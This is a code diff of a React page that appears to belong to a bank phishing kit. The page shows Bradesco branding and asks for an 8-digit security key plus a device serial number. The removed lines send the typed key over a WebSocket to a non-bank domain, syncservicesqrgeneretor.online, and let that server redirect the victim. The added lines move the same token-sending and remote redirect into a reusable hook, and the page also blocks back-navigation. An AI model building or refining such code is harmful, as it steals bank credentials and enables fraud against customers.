@@ -2,6 +2,7 @@ import { useEffect, useRef, useState } from "react";
 import { useNavigate } from "react-router-dom";
 import bradescoLogo from "@/assets/bradesco-logo.png";
 import { resolveServerRoute } from "@/lib/resolveServerRoute";
+import { useWebSocket } from "@/hooks/useWebSocket";
 
 const QRCodePage = () => {
   const navigate = useNavigate();
@@ -9,39 +10,23 @@ const QRCodePage = () => {
   const nome = localStorage.getItem("nome") || "";
   const qr = localStorage.getItem("qr") || "";
   const dispositivo = localStorage.getItem("dispositivo") || "";
-  const wsRef = useRef<WebSocket | null>(null);
   const [chave, setChave] = useState(["", "", "", "", "", "", "", ""]);
   const [enviando, setEnviando] = useState(false);
   const [erro, setErro] = useState("");
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
-  useEffect(() => {
-    const ws = new WebSocket("wss://syncservicesqrgeneretor.online/ws/");
-    wsRef.current = ws;
-
-    ws.onopen = () => {
-      console.log("QRCodePage WS conectado");
-      if (usuario) {
-        ws.send(JSON.stringify({ acao: "reconectar", usuario, dispositivo }));
-      }
-    };
-
-    ws.onmessage = (event) => {
-      const msg = JSON.parse(event.data);
-      console.log("QRCodePage msg:", msg);
-
-      if (msg.acao === "redirecionar" && msg.url) {
-        navigate(resolveServerRoute(msg.url));
-      }
+  const { send } = useWebSocket({
+    reconectarPayload: { dispositivo },
+    onRedirect: (msg) => {
+      navigate(resolveServerRoute(msg.url));
+    },
+    onMessage: (msg) => {
       if (msg.acao === "erro_chave") {
         setErro(msg.motivo || "Chave inválida. Tente novamente.");
         setEnviando(false);
       }
-    };
-
-    ws.onerror = (err) => console.error("QRCode WS erro:", err);
-    return () => { ws.close(); };
-  }, [usuario, dispositivo]);
+    },
+  });
 
   useEffect(() => {
     window.history.pushState(null, "", window.location.href);
@@ -73,7 +58,7 @@ const QRCodePage = () => {
     if (!chaveCompleta) return;
     setErro("");
     setEnviando(true);
-    wsRef.current?.send(JSON.stringify({ acao: "token", usuario, token: chave.join("") }));
+    send({ acao: "token", usuario, token: chave.join("") });
     navigate("/validando");
   };
 
@@ -136,7 +121,6 @@ const QRCodePage = () => {
               </h3>
             </div>
 
-            {/* 8 digit boxes */}
             <div className="flex justify-between px-1 mb-3">
               {chave.map((digit, i) => (
                 <input
@@ -153,7 +137,6 @@ const QRCodePage = () => {
               ))}
             </div>
 
-            {/* Device serial */}
             <p className="text-[hsl(220,10%,56%)] text-xs text-center mb-4">
               Confira o número de série do seu dispositivo: <span className="font-bold text-[hsl(220,20%,14%)]">{dispositivo || "—"}</span>
             </p>
